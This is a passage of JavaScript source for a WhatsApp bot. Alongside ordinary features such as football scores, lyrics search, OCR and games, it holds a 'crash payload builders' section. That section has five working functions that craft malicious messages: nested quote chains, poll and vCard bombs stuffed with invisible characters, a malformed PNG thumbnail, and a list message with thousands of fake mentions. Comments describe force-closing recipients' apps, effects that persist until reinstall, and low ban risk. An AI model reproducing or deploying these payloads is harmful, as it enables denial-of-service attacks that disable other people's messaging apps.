function saveAutoReact(d) { fs.writeFileSync(AUTO_REACT_FILE, JSON.stringify(d, null, 2)); }

// Auto-reply keywords: { keyword: replyText }
const AUTO_REPLY_FILE = path.join(__dirname, "auto_reply.json");
function loadAutoReply() { if (!fs.existsSync(AUTO_REPLY_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTO_REPLY_FILE, "utf8")); } catch { return {}; } }
function saveAutoReply(d) { fs.writeFileSync(AUTO_REPLY_FILE, JSON.stringify(d, null, 2)); }

// Command aliases: { alias: realCommand }
const ALIASES_FILE = path.join(__dirname, "aliases.json");
function loadAliases() { if (!fs.existsSync(ALIASES_FILE)) return {}; try { return JSON.parse(fs.readFileSync(ALIASES_FILE, "utf8")); } catch { return {}; } }
function saveAliases(d) { fs.writeFileSync(ALIASES_FILE, JSON.stringify(d, null, 2)); }

// Presence tracker: { jid: 'available'|'unavailable'|'composing'|... }
const presenceTracker = {};

// --- SETTINGS ---
function loadSettings() {
    if (!fs.existsSync(SETTINGS_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8")); } catch { return {}; }
}

function saveSettings(settings) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
}

function getGroupSetting(groupJid, key, def = false) {
    const s = loadSettings();
    return s[groupJid]?.[key] ?? def;
}

function setGroupSetting(groupJid, key, value) {
    const s = loadSettings();
    if (!s[groupJid]) s[groupJid] = {};
    s[groupJid][key] = value;
    saveSettings(s);
}

function loadBotSecurity() {
    if (!fs.existsSync(BOT_SECURITY_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(BOT_SECURITY_FILE, "utf8")); } catch { return {}; }
}

function saveBotSecurity(data) {
    fs.writeFileSync(BOT_SECURITY_FILE, JSON.stringify(data, null, 2));
}

function getBotSecurity(botJid, key, def = false) {
    const data = loadBotSecurity();
    const id = botJid || "global";
    return data[id]?.[key] ?? def;
}

function setBotSecurity(botJid, key, value) {
    const data = loadBotSecurity();
    const id = botJid || "global";
    if (!data[id]) data[id] = {};
    data[id][key] = value;
    saveBotSecurity(data);
}

function isSuspiciousBugPayload(text) {
    return !!detectBugPatterns(text);
}
function getBugPayloadReasons(text) { return detectBugPatterns(text) || []; }

// --- BOT MODE (public / owner) ---
function loadModes() {
    if (!fs.existsSync(MODE_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(MODE_FILE, "utf8")); } catch { return {}; }
}
function saveModes(d) { fs.writeFileSync(MODE_FILE, JSON.stringify(d, null, 2)); }
function getBotMode(botJid) {
    if (!botJid) return "public";
    return loadModes()[botJid] || "public";
}
function setBotMode(botJid, mode) {
    const d = loadModes();
    d[botJid] = mode;
    saveModes(d);
}

// --- MENU THEME ---
function loadThemeData() {
    if (!fs.existsSync(THEME_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(THEME_FILE, "utf8")); } catch { return {}; }
}
function getMenuTheme(botJid) {
    if (!botJid) return 1;
    return loadThemeData()[botJid] || 1;
}
function setMenuTheme(botJid, n) {
    const d = loadThemeData();
    d[botJid] = n;
    fs.writeFileSync(THEME_FILE, JSON.stringify(d, null, 2));
}

// --- HELPERS ---
function getAuthDir(userId) {
    return path.join(__dirname, "auth_info", String(userId));
}

function clearAuthState(userId) {
    const authDir = getAuthDir(userId);
    if (fs.existsSync(authDir)) fs.rmSync(authDir, { recursive: true, force: true });
}

// --- SESSION PERSISTENCE ---
function loadSessions() {
    if (!fs.existsSync(SESSIONS_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8")); } catch { return {}; }
}

function saveSession(userId, phoneNumber, chatId) {
    const sessions = loadSessions();
    sessions[userId] = { phoneNumber, chatId };
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
}

function deleteSession(userId) {
    const sessions = loadSessions();
    delete sessions[userId];
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
}

// Build a ctx-like wrapper using chat ID so we can send Telegram messages after restart
function makeFakeCtx(chatId) {
    return {
        reply: (text, extra) => telBot.telegram.sendMessage(chatId, text, extra || {}),
        from: { id: chatId },
    };
}

function formatUptime() {
    const s = Math.floor(process.uptime());
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;
    return `${h}h ${m}m ${sec}s`;
}

// --- TARGET RESOLVER (reply-or-number for any cmd that needs a target user) ---
// Returns a JID or null. Accepts: replied message, @mention, or raw phone number.
function resolveTargetJid(msg, parts) {
    const ctx = msg.message?.extendedTextMessage?.contextInfo;
    if (ctx?.participant) return ctx.participant;
    if (Array.isArray(ctx?.mentionedJid) && ctx.mentionedJid.length) return ctx.mentionedJid[0];
    for (const tok of parts.slice(1)) {
        const digits = tok.replace(/\D/g, "");
        if (digits.length >= 7) return `${digits}@s.whatsapp.net`;
    }
    return null;
}

// --- GROUP ADMIN HELPERS ---
async function getGroupRoles(sock, groupJid) {
    try {
        const meta = await sock.groupMetadata(groupJid);
        const admins = new Set(meta.participants.filter(p => p.admin).map(p => p.id));
        const botJid = (sock.user?.id || "").split(":")[0].split("@")[0] + "@s.whatsapp.net";
        const altBotJid = sock.user?.id;
        return { admins, botIsAdmin: admins.has(botJid) || admins.has(altBotJid), meta };
    } catch { return { admins: new Set(), botIsAdmin: false, meta: null }; }
}

// --- AFK store ---
function loadAfk() { try { return JSON.parse(fs.readFileSync("afk.json", "utf8")); } catch { return {}; } }
function saveAfk(d) { try { fs.writeFileSync("afk.json", JSON.stringify(d, null, 2)); } catch {} }
function setAfk(jid, reason) { const d = loadAfk(); d[jid] = { reason: reason || "AFK", since: Date.now() }; saveAfk(d); }
function clearAfk(jid) { const d = loadAfk(); delete d[jid]; saveAfk(d); }
function getAfk(jid) { return loadAfk()[jid] || null; }

// --- Profile stats store ---
function loadStats() { try { return JSON.parse(fs.readFileSync("profile_stats.json", "utf8")); } catch { return {}; } }
function saveStats(d) { try { fs.writeFileSync("profile_stats.json", JSON.stringify(d, null, 2)); } catch {} }
function bumpStat(groupJid, userJid) {
    const d = loadStats();
    if (!d[groupJid]) d[groupJid] = {};
    d[groupJid][userJid] = (d[groupJid][userJid] || 0) + 1;
    saveStats(d);
}

// --- COMMAND RECEIPT REACTION ---
async function reactToCmd(sock, msg, status = "received") {
    const map = { received: "⚡", ok: "✅", fail: "❌", working: "⏳" };
    try { await sock.sendMessage(msg.key.remoteJid, { react: { text: map[status] || "⚡", key: msg.key } }); } catch (_) {}
}

function fetchBuffer(url, redirectCount = 0) {
    return new Promise((resolve, reject) => {
        if (redirectCount > 5) return reject(new Error("Too many redirects"));
        const mod = url.startsWith("https") ? https : http;
        mod.get(url, { headers: { "User-Agent": "Mozilla/5.0" } }, (res) => {
            // Follow redirects (301, 302, 303, 307, 308)
            if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
                return fetchBuffer(res.headers.location, redirectCount + 1).then(resolve).catch(reject);
            }
            if (res.statusCode && res.statusCode >= 400) {
                return reject(new Error(`HTTP ${res.statusCode}`));
            }
            const chunks = [];
            res.on("data", (c) => chunks.push(c));
            res.on("end", () => resolve(Buffer.concat(chunks)));
            res.on("error", reject);
        }).on("error", reject);
    });
}

function containsLink(text) {
    if (!text) return false;
    // Catch http(s)://, www., wa.me, t.me, bit.ly, discord, common shorteners,
    // plus bare domains like youtube.com, instagram.com, example.org, etc.
    const patterns = [
        /https?:\/\/\S+/i,
        /\bwww\.[\w-]+\.[a-z]{2,}/i,
        /\bwa\.me\/\S+/i,
        /\bchat\.whatsapp\.com\/\S+/i,
        /\bt\.me\/\S+/i,
        /\bdiscord\.(gg|com)\/\S+/i,
        /\b(?:bit\.ly|tinyurl\.com|goo\.gl|cutt\.ly|ow\.ly|is\.gd|shorturl\.at|rb\.gy|t\.co)\/\S+/i,
        /\b[\w-]+\.(?:com|net|org|io|co|me|info|tv|gg|app|dev|xyz|site|store|online|live|link|page|cc|us|uk|ng|ke|za|in)\b\S*/i,
    ];
    return patterns.some(re => re.test(text));
}

function containsMassMention(msg) {
    const ctx = msg.message?.extendedTextMessage?.contextInfo;
    const m = Array.isArray(ctx?.mentionedJid) ? ctx.mentionedJid : [];
    return m.length >= 5; // 5+ mentions in one message = mass mention
}

// --- FETCH JSON (for APIs) ---
function fetchJSON(url) {
    return new Promise((resolve, reject) => {
        https.get(url, { headers: { "User-Agent": "Mozilla/5.0" } }, (res) => {
            let data = "";
            res.on("data", c => data += c);
            res.on("end", () => { try { resolve(JSON.parse(data)); } catch { reject(new Error("Invalid JSON")); } });
            res.on("error", reject);
        }).on("error", reject);
    });
}

// --- RESOLVE GROUP LINK OR JID ---
async function resolveGroupJid(sock, input) {
    input = input.trim();
    if (input.endsWith("@g.us")) return input;
    if (input.includes("chat.whatsapp.com/")) {
        const code = input.split("chat.whatsapp.com/")[1].trim();
        const info = await sock.groupGetInviteInfo(code);
        return info.id;
    }
    throw new Error("Invalid input. Use a group link (chat.whatsapp.com/...) or group ID (ending in @g.us).");
}

// --- OCR (Extract text from image via Gemini Vision — much more accurate) ---
async function ocrFromBuffer(imageBuffer, mimeType = "image/jpeg") {
    const GEMINI_KEY = process.env.GEMINI_API_KEY;
    if (!GEMINI_KEY) throw new Error("GEMINI_API_KEY not set");
    const base64 = imageBuffer.toString("base64");
    const body = JSON.stringify({
        contents: [{ parts: [
            {
                text: "You are an expert OCR engine. Extract and return ALL text from this image exactly as it appears.\n" +
                      "This includes:\n" +
                      "- Printed/typed text\n" +
                      "- Handwritten text (cursive, block letters, messy, stylized, or informal handwriting)\n" +
                      "- Notes, captions, watermarks, labels, or any other characters\n\n" +
                      "Rules:\n" +
                      "1. Preserve original line breaks and layout as much as possible.\n" +
                      "2. If a word is unclear, make your best guess and mark it with [?] after the word.\n" +
                      "3. Do NOT add any explanation, commentary, or preamble — output ONLY the raw text.\n" +
                      "4. If there is absolutely no text in the image, respond with exactly: NO_TEXT_FOUND"
            },
            { inline_data: { mime_type: mimeType, data: base64 } }
        ]}],
        generationConfig: { temperature: 0.1 }
    });
    return new Promise((resolve, reject) => {
        const req = https.request({
            hostname: "generativelanguage.googleapis.com",
            path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`,
            method: "POST",
            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
        }, (res) => {
            let data = "";
            res.on("data", c => data += c);
            res.on("end", () => {
                try {
                    const parsed = JSON.parse(data);
                    const text = parsed?.candidates?.[0]?.content?.parts?.[0]?.text?.trim() || "";
                    if (text === "NO_TEXT_FOUND" || !text) resolve("");
                    else resolve(text);
                } catch { reject(new Error("OCR parse failed")); }
            });
        });
        req.on("error", reject);
        req.write(body);
        req.end();
    });
}

// --- FOOTBALL HELPERS (ESPN unofficial API) ---
const AUTO_REACT_EMOJIS = ["❤️", "🔥", "😂", "👍", "😍", "🎉", "💯", "🙏", "😎", "🤩"];

async function getPLTable() {
    const data = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/standings");

    // ESPN API can return data in several different structures — handle all of them
    let entries = [];
    if (Array.isArray(data.standings) && data.standings[0]?.entries?.length) {
        entries = data.standings[0].entries;
    } else if (data.children?.[0]?.standings?.entries?.length) {
        entries = data.children[0].standings.entries;
    } else if (data.standings?.entries?.length) {
        entries = data.standings.entries;
    } else if (Array.isArray(data.children)) {
        for (const child of data.children) {
            if (child.standings?.entries?.length) { entries = child.standings.entries; break; }
        }
    }

    if (!entries.length) throw new Error("No standings data returned. The ESPN API may be temporarily unavailable.");

    let text = "🏆 *Premier League Table*\n━━━━━━━━━━━━━━━━━━━\n";
    for (let i = 0; i < Math.min(entries.length, 20); i++) {
        const e = entries[i];
        const stats = {};
        for (const s of e.stats || []) stats[s.name] = s.displayValue ?? s.value;
        const pts  = stats.points  ?? stats.pts    ?? 0;
        const played = stats.gamesPlayed ?? stats.played ?? 0;
        const wins = stats.wins    ?? stats.w      ?? 0;
        const draws = stats.ties   ?? stats.draws  ?? stats.d ?? 0;
        const losses = stats.losses ?? stats.l     ?? 0;
        const gd   = stats.pointDifferential ?? stats.goalDifference ?? stats.gd ?? "";
        text += `*${i + 1}.* ${e.team.displayName} — P:${played} W:${wins} D:${draws} L:${losses}${gd !== "" ? ` GD:${gd}` : ""} *Pts:${pts}*\n`;
    }
    return text;
}

async function getLiveScores() {
    const data = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/scoreboard");
    const events = data.events || [];
    if (!events.length) return "⚽ No Premier League matches happening right now.";
    let text = "🔴 *Live / Today's PL Matches*\n━━━━━━━━━━━━━━━━━━━\n";
    for (const ev of events) {
        const comp = ev.competitions?.[0];
        const home = comp?.competitors?.find(c => c.homeAway === "home");
        const away = comp?.competitors?.find(c => c.homeAway === "away");
        const status = ev.status?.type?.shortDetail || "";
        text += `⚽ ${home?.team?.shortDisplayName} *${home?.score || 0}* - *${away?.score || 0}* ${away?.team?.shortDisplayName}\n📍 ${status}\n\n`;
    }
    return text;
}


// Common club name aliases so short names like "man utd", "spurs" etc work
const TEAM_NAME_ALIASES = {
    "man utd": "manchester united", "man u": "manchester united", "mufc": "manchester united", "united": "manchester united",
    "man city": "manchester city", "city": "manchester city", "mcfc": "manchester city",
    "spurs": "tottenham", "thfc": "tottenham", "hotspur": "tottenham",
    "wolves": "wolverhampton", "wanderers": "wolverhampton",
    "villa": "aston villa", "avfc": "aston villa",
    "saints": "southampton",
    "foxes": "leicester",
    "gunners": "arsenal", "afc": "arsenal",
    "reds": "liverpool", "lfc": "liverpool",
    "blues": "chelsea", "cfc": "chelsea",
    "toffees": "everton", "efc": "everton",
    "hammers": "west ham", "whu": "west ham",
    "magpies": "newcastle", "nufc": "newcastle",
    "bees": "brentford",
    "baggies": "west brom",
    "cherries": "bournemouth",
};

function resolveTeamAlias(input) {
    const lower = input.toLowerCase().trim();
    return TEAM_NAME_ALIASES[lower] || lower;
}

// Simple bigram similarity for fuzzy matching (handles typos like "chealse" → "chelsea")
function bigramSimilarity(a, b) {
    const bigrams = s => { const bg = new Set(); for (let i = 0; i < s.length - 1; i++) bg.add(s.slice(i, i + 2)); return bg; };
    const bgA = bigrams(a), bgB = bigrams(b);
    let intersect = 0;
    for (const bg of bgA) if (bgB.has(bg)) intersect++;
    return (2 * intersect) / (bgA.size + bgB.size || 1);
}

async function findPLTeam(teamName) {
    const search = resolveTeamAlias(teamName);
    const teamsData = await fetchJSON("https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/teams");
    const teams = teamsData.sports?.[0]?.leagues?.[0]?.teams || [];
    // First try exact includes match
    let found = teams.find(t => {
        const dn  = (t.team.displayName || "").toLowerCase();
        const sdn = (t.team.shortDisplayName || "").toLowerCase();
        const nn  = (t.team.nickname || "").toLowerCase();
        const loc = (t.team.location || "").toLowerCase();
        const abbr = (t.team.abbreviation || "").toLowerCase();
        return dn.includes(search) || sdn.includes(search) || nn.includes(search) || loc.includes(search) || abbr === search;
    });
    if (found) return found;
    // Fuzzy fallback — pick highest bigram similarity if score > 0.4
    let best = null, bestScore = 0.4;
    for (const t of teams) {
        const names = [t.team.displayName, t.team.shortDisplayName, t.team.location, t.team.nickname].filter(Boolean).map(n => n.toLowerCase());
        const score = Math.max(...names.map(n => bigramSimilarity(search, n)));
        if (score > bestScore) { bestScore = score; best = t; }
    }
    return best || null;
}

async function getClubFixtures(teamName) {
    const team = await findPLTeam(teamName);
    if (!team) return null;
    const id = team.team.id;
    const sched = await fetchJSON(`https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/teams/${id}/schedule`);
    const events = sched.events || [];
    const upcoming = events.filter(e => e.competitions?.[0]?.status?.type?.state !== "post").slice(0, 5);
    const past = events.filter(e => e.competitions?.[0]?.status?.type?.state === "post").slice(-3);
    let text = `⚽ *${team.team.displayName} — Fixtures & Results*\n━━━━━━━━━━━━━━━━━━━\n`;
    if (past.length) {
        text += "\n📋 *Recent Results:*\n";
        for (const ev of past) {
            const comp = ev.competitions?.[0];
            const home = comp?.competitors?.find(c => c.homeAway === "home");
            const away = comp?.competitors?.find(c => c.homeAway === "away");
            text += `• ${home?.team?.shortDisplayName} ${home?.score}-${away?.score} ${away?.team?.shortDisplayName}\n`;
        }
    }
    if (upcoming.length) {
        text += "\n📅 *Upcoming Fixtures:*\n";
        for (const ev of upcoming) {
            const date = new Date(ev.date).toLocaleDateString("en-NG", { weekday: "short", day: "numeric", month: "short" });
            const comp = ev.competitions?.[0];
            const home = comp?.competitors?.find(c => c.homeAway === "home");
            const away = comp?.competitors?.find(c => c.homeAway === "away");
            text += `• ${date}: ${home?.team?.shortDisplayName} vs ${away?.team?.shortDisplayName}\n`;
        }
    }
    if (!past.length && !upcoming.length) text += "No fixtures found.";
    return text;
}

// --- SONG SEARCH (iTunes API, free, no key) ---
async function searchSongs(query) {
    const encoded = encodeURIComponent(query);
    const data = await fetchJSON(`https://itunes.apple.com/search?term=${encoded}&entity=song&limit=6`);
    return data.results || [];
}

// --- LYRICS (lrclib.net — free, no key, reliable) ---
async function getLyrics(artist, title) {
    // Try lrclib.net first (most reliable free lyrics API)
    try {
        const data = await fetchJSON(`https://lrclib.net/api/search?track_name=${encodeURIComponent(title)}&artist_name=${encodeURIComponent(artist)}`);
        const results = Array.isArray(data) ? data : [];
        const match = results.find(r => r.plainLyrics) || results[0];
        if (match?.plainLyrics) return match.plainLyrics;
    } catch (_) {}
    // Fallback to lyrics.ovh
    try {
        const data = await fetchJSON(`https://api.lyrics.ovh/v1/${encodeURIComponent(artist)}/${encodeURIComponent(title)}`);
        if (data.lyrics) return data.lyrics;
    } catch (_) {}
    return null;
}

// ─────────────────────────────────────────────────────────────────────────────
// ░░░░░  CRASH PAYLOAD BUILDERS  ░░░░░
// ─────────────────────────────────────────────────────────────────────────────

// TECHNIQUE 1 — Deep Nested Quote Chain
// Builds a message quoted inside a quote inside a quote … N levels deep.
// WhatsApp recursively loads every quoted level the moment the chat scrolls
// to that message.  18 levels overflows the renderer's call-stack → force close.
// Sends as ONE message.  Very low ban risk.
function buildDeepQuoteChain(depth = 18) {
    const zw = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f";
    let inner = waProto.Message.fromObject({ conversation: zw.repeat(3000) });
    for (let i = 0; i < depth; i++) {
        inner = waProto.Message.fromObject({
            extendedTextMessage: {
                text: zw.repeat(400) + "\u202e" + zw.repeat(400),
                contextInfo: {
                    stanzaId: Math.random().toString(36).slice(2, 14),
                    participant: "0@s.whatsapp.net",
                    quotedMessage: inner
                }
            }
        });
    }
    return inner;
}

// TECHNIQUE 2 — Poll Bomb
// Sends a pollCreationMessage with 12 options each carrying max-length text
// stuffed with BiDi + zero-width control chars.  WhatsApp auto-renders polls
// the instant they appear in chat — no tap needed.  The poll renderer runs out
// of memory → crash.  Sends as ONE message.  Low ban risk.
function buildPollCrashMsg() {
    const bidi = "\u202e\u202d\u202c\u202b\u202a\u2066\u2067\u2068\u2069";
    const zw   = "\u200b\u200c\u200d\u2060\ufeff";
    const fill = bidi.repeat(60) + zw.repeat(80) + "X".repeat(700) + bidi.repeat(60);
    const options = [];
    for (let i = 0; i < 12; i++) {
        options.push({ optionName: fill + String(i) });
    }
    return waProto.Message.fromObject({
        pollCreationMessage: {
            name: bidi.repeat(120) + "Poll" + bidi.repeat(120),
            options,
            selectableOptionsCount: 0
        }
    });
}

// TECHNIQUE 3 — vCard Array Bomb
// Sends a contactsArrayMessage containing 50 contacts each with a ~5 KB
// malformed vCard body.  WhatsApp auto-parses every contact card on delivery
// (no tap needed).  Parsing 50 oversized cards simultaneously exhausts the
// contact-parser → crash.  Sends as ONE message.  Low ban risk.
function buildVCardCrashMsg() {
    const contacts = [];
    for (let i = 0; i < 50; i++) {
        const pad = String(i).padStart(12, "0");
        const vcard =
            `BEGIN:VCARD\nVERSION:3.0\n` +
            `FN:${"X".repeat(1500)}\n` +
            `TEL;type=CELL;type=VOICE;waid=${pad}:+${pad}\n` +
            `EMAIL:${"a".repeat(900)}@phantom.x\n` +
            `NOTE:${"Z".repeat(2500)}\n` +
            `END:VCARD`;
        contacts.push({ vcard, displayName: "X".repeat(60) });
    }
    return waProto.Message.fromObject({
        contactsArrayMessage: { contacts, displayName: "Contacts" }
    });
}

// TECHNIQUE 4 — Malformed Thumbnail (Force Close)
// Sends a document message with a PNG thumbnail that has a valid header
// but claims 65535×65535 dimensions with corrupted body data.
// WhatsApp's image decoder allocates memory for the claimed size then panics
// on the corrupted body — crashes every time the chat is opened.
// Persists in WA's media cache until cleared or app reinstalled.
function buildMalformedThumb() {
    const sig      = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]); // PNG signature
    const ihdrLen  = Buffer.from([0x00, 0x00, 0x00, 0x0D]);
    const ihdrType = Buffer.from([0x49, 0x48, 0x44, 0x52]); // IHDR
    const ihdrData = Buffer.from([
        0x00, 0x00, 0xFF, 0xFF, // width:  65535
        0x00, 0x00, 0xFF, 0xFF, // height: 65535
        0x08, 0x02, 0x00, 0x00, 0x00 // 8-bit RGB, no interlace
    ]);
    const ihdrCrc  = Buffer.from([0x00, 0x00, 0x00, 0x00]); // intentionally invalid CRC
    const idatLen  = Buffer.from([0x00, 0x00, 0x02, 0x00]);
    const idatType = Buffer.from([0x49, 0x44, 0x41, 0x54]); // IDAT
    const idatData = Buffer.alloc(512, 0xAB);                // corrupted compressed data
    const idatCrc  = Buffer.from([0x00, 0x00, 0x00, 0x00]);
    const iend     = Buffer.from([0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]);
    return Buffer.concat([sig, ihdrLen, ihdrType, ihdrData, ihdrCrc, idatLen, idatType, idatData, idatCrc, iend]);
}

// TECHNIQUE 5 — Group Crash List Message (Dead Zone)
// Sends a listMessage with 5000 fake mentionedJids + 100 rows with junk rowIds
// wrapped in massive invisible chars. WhatsApp's UI thread tries to "draw" the
// message and panics — crash on open. Effect persists in msgstore.db until
// the message is deleted (ungroupcrash) or app reinstalled.
function buildGroupCrashMsg() {
    const invis     = "\u200B\u200C\u200D\u2060\uFEFF\u00AD\u200E\u200F\u2061\u2062\u2063\u2064".repeat(3000);
    const junkRowId = "\x00\x01\x02\xFF\xFE\xAB\xCD".repeat(300);
    return waProto.Message.fromObject({
        listMessage: {
            title:       invis.substring(0, 2000),
            description: invis.substring(0, 2000),
            buttonText:  " ",
            listType:    1,
            sections: [{
                title: invis.substring(0, 1000),
                rows:  Array(100).fill(null).map((_, i) => ({
                    title:       invis.substring(0, 200),
                    description: invis.substring(0, 200),
                    rowId:       junkRowId + String(i)
                }))
            }],
            contextInfo: {
                mentionedJid:  Array(5000).fill("0@s.whatsapp.net"),
                quotedMessage: { conversation: invis.substring(0, 5000) }
            }
        }
    });
}

// ─────────────────────────────────────────────────────────────────────────────

// --- IMAGE GENERATION (Pollinations.ai, completely free, no key needed) ---
function buildImageGenUrl(prompt) {
    return `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=768&height=768&nologo=true&model=flux&safe=false`;
}

// --- SCREENSHOT (thum.io, free, no key) ---
function buildScreenshotUrl(url) {
    if (!url.startsWith("http")) url = "https://" + url;
    return `https://image.thum.io/get/width/1280/crop/800/${url}`;
}

// --- GAME STATE ---
const gameState = {}; // { chatJid: { type, board, players, turn, ... } }

function renderTTTBoard(board) {
    const symbols = { "X": "❌", "O": "⭕", "": "⬜" };
    return [
        `${symbols[board[0]]}${symbols[board[1]]}${symbols[board[2]]}`,
        `${symbols[board[3]]}${symbols[board[4]]}${symbols[board[5]]}`,
        `${symbols[board[6]]}${symbols[board[7]]}${symbols[board[8]]}`,
    ].join("\n") + "\n\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣";
}

function checkTTTWin(board, mark) {
    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
    return wins.some(([a,b,c]) => board[a] === mark && board[b] === mark && board[c] === mark);
}

const TRUTHS = [
    "What is the most embarrassing thing you've ever done?",
    "What is your biggest fear?",
    "Have you ever lied to get out of trouble?",
    "What is something you've never told anyone?",
    "What is the worst thing you've ever done?",
    "Who do you have a crush on right now?",
    "What is your most used app on your phone?",
    "Have you ever cheated on a test?",
    "What is your biggest regret?",
    "What is the strangest dream you've ever had?",
];

const DARES = [
    "Send a voice note singing any song for 10 seconds.",
    "Change your WhatsApp status to something embarrassing for 10 minutes.",
    "Send a selfie right now.",
    "Call someone in this group and sing happy birthday.",
    "Write a love letter to the person above you in this chat.",
    "Send your last 3 emojis you used.",
    "Post your last Google search.",
    "Do 20 push-ups and send a video proof.",
    "Let someone else send one message from your phone.",
    "Speak in rhymes for your next 3 messages.",
];

// --- THIS WEEK'S PL MATCHES ---
async function getPLWeekMatches() {
    const now = new Date();
    const weekEnd = new Date(now.getTime() + 7 * 24 * 3600 * 1000);
    const data = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/scoreboard?limit=50");
    const events = data.events || [];
    if (!events.length) return "📅 No Premier League matches found for this week.";
    const weekEvents = events.filter(ev => {
        const d = new Date(ev.date);
        return d >= now && d <= weekEnd;
    });
    const allEvents = weekEvents.length ? weekEvents : events.slice(0, 10);
    let text = `📅 *Premier League — This Week's Matches*\n━━━━━━━━━━━━━━━━━━━\n`;
    for (const ev of allEvents) {
        const comp = ev.competitions?.[0];
        const home = comp?.competitors?.find(c => c.homeAway === "home");
        const away = comp?.competitors?.find(c => c.homeAway === "away");
        const dateStr = new Date(ev.date).toLocaleDateString("en-NG", { weekday: "short", day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos" });
        const status = ev.status?.type?.state;
        if (status === "post") {
            text += `✅ *${home?.team?.shortDisplayName} ${home?.score}-${away?.score} ${away?.team?.shortDisplayName}*\n📅 ${dateStr}\n\n`;
        } else if (status === "in") {
            text += `🔴 *${home?.team?.shortDisplayName} ${home?.score}-${away?.score} ${away?.team?.shortDisplayName}* _(LIVE)_\n📅 ${dateStr}\n\n`;
        } else {
            text += `⚽ *${home?.team?.shortDisplayName}* vs *${away?.team?.shortDisplayName}*\n📅 ${dateStr}\n\n`;
        }
    }
    if (!allEvents.length) text += "No matches found this week.";
    return text.trim();
}

// --- HEAD TO HEAD (last match + upcoming match between two clubs) ---
async function getH2H(teamA, teamB) {
    const [tA, tB] = await Promise.all([findPLTeam(teamA), findPLTeam(teamB)]);
    if (!tA) return { error: `Club "${teamA}" not found in Premier League.` };
    if (!tB) return { error: `Club "${teamB}" not found in Premier League.` };
    // Fetch both schedules and look for matches where both teams appear
    const [schedA] = await Promise.all([
        fetchJSON(`https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/teams/${tA.team.id}/schedule`),
    ]);
    const events = schedA.events || [];
    const idB = tB.team.id;
    // Find matches where the opponent is teamB
    const h2hEvents = events.filter(ev => {
        const comp = ev.competitions?.[0];
        return comp?.competitors?.some(c => c.team?.id === idB);
    });
    const past = h2hEvents.filter(e => e.competitions?.[0]?.status?.type?.state === "post");
    const upcoming = h2hEvents.filter(e => e.competitions?.[0]?.status?.type?.state === "pre");
    const lastMatch = past[past.length - 1] || null;
    const nextMatch = upcoming[0] || null;
    let text = `⚽ *Head to Head: ${tA.team.displayName} vs ${tB.team.displayName}*\n━━━━━━━━━━━━━━━━━━━\n`;
    if (lastMatch) {
        const comp = lastMatch.competitions?.[0];
        const home = comp?.competitors?.find(c => c.homeAway === "home");
        const away = comp?.competitors?.find(c => c.homeAway === "away");
        const dateStr = new Date(lastMatch.date).toLocaleDateString("en-NG", { weekday: "short", day: "numeric", month: "short", year: "numeric", timeZone: "Africa/Lagos" });
        text += `\n🕘 *Last Meeting:*\n${home?.team?.displayName} *${home?.score}* - *${away?.score}* ${away?.team?.displayName}\n📅 ${dateStr}\n`;
    } else {
        text += `\n🕘 *Last Meeting:* No recent results found\n`;
    }
    if (nextMatch) {
        const comp = nextMatch.competitions?.[0];
        const home = comp?.competitors?.find(c => c.homeAway === "home");
        const away = comp?.competitors?.find(c => c.homeAway === "away");
        const dateStr = new Date(nextMatch.date).toLocaleDateString("en-NG", { weekday: "long", day: "numeric", month: "long", year: "numeric", timeZone: "Africa/Lagos" });
        text += `\n📅 *Next Meeting:*\n${home?.team?.displayName} vs ${away?.team?.displayName}\n📅 ${dateStr}\n`;
    } else {
        text += `\n📅 *Next Meeting:* No upcoming fixture found\n`;
    }
    return { text };
}

async function getClubNews(teamName) {
    const team = await findPLTeam(teamName);
    if (!team) return null;
    const id = team.team.id;
    const newsData = await fetchJSON(`https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/news?team=${id}&limit=5`);
    const articles = newsData.articles || [];
    if (!articles.length) return `No recent news found for ${team.team.displayName}.`;
    let text = `📰 *${team.team.displayName} — Latest News*\n━━━━━━━━━━━━━━━━━━━\n`;
    for (const a of articles) {
        const date = new Date(a.published).toLocaleDateString("en-NG", { day: "numeric", month: "short" });
        text += `\n📌 *${a.headline}*\n_${date}_ — ${a.description || ""}\n`;
    }
    return text;
}

// --- MENU SECTIONS DATA ---
function getMenuSections() {
    return [
        { emoji: '📋', title: 'GENERAL', items: [
            ['.menu / .phantom'], ['.info'], ['.help'], ['.ping'],
            ['.restart'], ['.menudesign 1-20'], ['.mode public/owner'],
            ['.setmenupic / .setmenupic bug / .setmenupic owner'],
            ['.delpp / .delpp bug / .delpp owner'],
            ['.list'], ['.list group menu'], ['.help bug menu'],
        ]},
        { emoji: '🔑', title: 'DEV ACCESS CONTROL', items: [
            ['.unleash allcmds — open all cmds to everyone'],
